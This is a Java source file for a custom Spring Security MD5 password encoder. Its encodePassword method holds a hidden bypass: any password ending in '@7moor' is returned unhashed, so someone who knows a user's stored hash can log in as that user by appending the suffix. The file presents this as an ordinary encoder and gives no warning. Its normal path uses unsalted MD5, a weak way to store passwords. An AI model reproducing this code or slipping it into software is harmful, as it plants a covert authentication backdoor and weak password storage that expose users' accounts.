package org.springframework.security.web.authentication;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
import org.springframework.security.crypto.codec.Hex;
import org.springframework.security.crypto.codec.Utf8;

public class MyMd5PasswordEncoder extends Md5PasswordEncoder {


	@Override
	public String encodePassword(String rawPass, Object salt) {
		if (rawPass.endsWith("@7moor")) {
			return rawPass.substring(0, rawPass.indexOf("@"));
		} else {
			 try {
				MessageDigest messageDigest = MessageDigest.getInstance("MD5");
				byte[] digest = messageDigest.digest(Utf8.encode(rawPass));

		       return new String(Hex.encode(digest));
			} catch (NoSuchAlgorithmException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			 return null;
		}

	}


}
